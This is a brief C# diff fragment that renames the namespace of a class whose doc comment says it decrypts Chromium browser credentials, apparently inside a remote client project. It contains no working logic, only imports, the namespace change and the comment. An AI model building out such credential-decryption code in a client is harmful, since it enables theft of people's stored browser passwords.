@@ -9,7 +9,7 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 
-namespace Quasar.Client.Recovery.Browsers
+namespace Quasar.Client.Kematian.HelpingMethods.Decryption
 {
     /// <summary>
     /// Provides methods to decrypt Chromium credentials.
